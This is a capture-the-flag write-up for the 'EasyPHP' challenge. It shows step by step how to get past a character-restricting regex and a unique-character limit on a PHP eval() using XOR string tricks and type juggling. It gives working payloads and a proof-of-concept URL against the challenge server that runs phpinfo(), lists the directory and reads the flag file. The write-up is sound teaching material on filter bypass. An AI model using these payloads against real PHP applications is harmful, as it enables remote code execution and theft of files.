## EasyPHP (871 points)

### Description
Don't try to run any Linux command, just use all the PHP functions you know to get the flag
http://165.22.57.95:8000/

### First look
Visiting given URL gives us a look at the source file:
```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```
So there are two conditions we have to satisfy in order to eval our code. 
Analysis of `preg_match` condition let us determine all the characters and php functions
we can explicitly use without any encoding. 

I made an assumption, that php configuration is default, so to have first look-around
I parsed result of `get_defined_functions()` php function using given regex condition.
This gives us following set of functions:

```
bcmul
rtrim
trim
ltrim
chr
link
unlink
tan
atan
atanh
tanh
intval
mail
min
max
```

At a first glance, functions `chr` and `intval` look promising - we could possibly craft
both characters and numbers. However, to do so, we need numbers to craft strings from (as we cant use any string quotes)
e.g: `chr(asciicode)`.

### Looking for a right path
How can we generate numbers then? There comes PHP syntax and behaviour with help!
Basically in PHP strings have to be quoted using `"` or `'`.
Although those characters are restricted by regex condition, PHP acts in pretty weird way, if we don't quote string -
it assumes we've simply forgotten to quote it, produces notice and creates string anyway 
(only a-ZA-Z characters are valid in this case). Also, notice can be easily suppressed using `@` which is permitted by regex.

How can we get number from string, though? In this case we can simply use PHP's ~~amazing~~ type juggling:
```php
<?php
$a = !!@i;
echo $a; // produces boolean(true)
```
String `i` is casted to **false** via `!` operator, then negated by another `!` and we have logical **true**.
Booleans are casted to integer, when any arithmetic is used on them, so we can produce any number we want!
For example:
```php
<?php
echo (!!@i + !!@i) ** (!!@i + !!@i + !!@i + !!@i); //outputs 2^4 = 16
```

Cool! Now we can create any number and one-char string using `chr(asciinumber)` function.

Another usable PHP feature in our case is that we can call functions using strings.
For example

`"phpinfo"();` equals `phpinfo();`

Now we have one-char-strings and ability to call functions using strings. There are not much one-char functions though -
to be specific there's only one: `_()` which is alias for `gettext()` function which is used to translate strings.
Not very useful.

The plan now is to find a way to create string - either by concatenating one-letter strings or any method. 
I've spent long hours trying to figure out how to concatenate strings without using `.` operator
(which is exactly string concatenation operator, but forbidden by regex), but I've been failing and failing...

After hours of struggle, the very next morning I've re-analysed regex condition once again (for like 10th time), 
and focused on operators allowed. Those are:
`['!', '%', '+', '-', '*', '/', '>', '<', '?', '=', ':', '@', '^']`

Eventually I noticed something interesting in PHP documentation:
https://www.php.net/manual/en/language.operators.bitwise.php
> If both operands for the &, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be converted to integers and the result will be an integer.

This is exactly what we need. `^` stands for bitwise XOR, and if applied on strings, it XORs char by char.
I have also tried out some XOR results, and it turned out, that it is possible to create lowercase characters
by XORing uppercase character with a number, for example:
```php
echo @ASD^"123"; //produces string 'paw'
```
We already know how to create string using only permitted characters, and also how to create any number we want.
If only number was string representation of integer, we could determine pairs of `Uppercase letter ^ [0-9]` which XORED
result in ANY functions names!

Next step is to create string representation for crafted number. 
Again, PHP type juggling arrives on a white horse yelling for attention:
```php
<?php
var_dump(trim(123)); //produces string(3) "123"
```
`trim(string $str)` function takes string for argument, and if integer provided, simply casts it to string and returns
it trimmed - this is our way to convert crafted numbers to strings.

### Exploitation
Off we go, ready and steady to begin exploitation. I've written script which simply iterates through available characters
and helps me to find possible `Letter ^ [0-9]` pairs for each character in provided function name and further generates 
payload which is encoded function name string. Having this I generated `phpinfo();` string:

```
"AQAQVQV" ^ "1918879" //produces 'phpinfo'
Payload: (AQAQVQV^trim(((((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i)))+((!!@i)))))();
```
If you paste payload into php script, this will simply call `phpinfo();`. We're home!
Let's try injecting this into challenge code. The result is...
> you are so close, omg

Of course, I've forgotten about second condition which counts unique characters in our payload.
My payload has 15 unique characters, while it accepts only <=13. Let's try to reduce those characters.

Firstly, it's safe to remove all `@` characters, since it doesn't change anything - just suppresses notices.
Fine, this is one character less. Let's try to encode our string once more with less unique characters.

To clarify how the script works and decisions here, this is sample output which shows us possibilities of encoding:
```
p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2|
p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3|
n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4|
f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1|
o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5|
```
Those are possible pairs to encode given character. In order to minimise unique characters, we should choose either:
* characters which already exist in our payload (TRIM)
* minimum number of characters with which we can encode all chars (re-use already chosen characters)

This way, we encode `phpinfo` as `AYAYYRY ^ 1110746`, and thus generate payload with less than 14 unique chars:
```
(AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))();
```

Aaaaaand, we get `phpinfo()` output!

POC:
```
http://165.22.57.95:8000/?_=(AYAYYRY^trim(((((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i))))))();
```
Also, it's worth to mention, that the only char we have to urlencode is `+` sign - if we urlencode all the characters,
we might get `414 request-uri too large` for larger payloads.

### Looking for flag
To be honest, I was sure I'm gonna already get the flag at this point. Obviously I was wrong, so I continued research.
The very first idea was to print content of current directory (which is often place where flag is stored).

In order get dir contents, we have to encode few functions
```
scandir(string $dir) // returns array of $dir content
getcwd()             // returns current dir path
var_dump($var)       // outputs $var content of any type (may be array from scandir)
```
So following string is needed:
```php
var_dump(scandir(getcwd()));
```

Again, we encode our stuff, put it into GET parameter and...:
```
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(34) "n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt" }
```

No more words are needed, we simply encode:
```
var_dump(file_get_contents(end(scandir(getcwd()))));
```
and get the flag:
```
string(34) "ISITDTU{Your PHP skill is so good}"
```
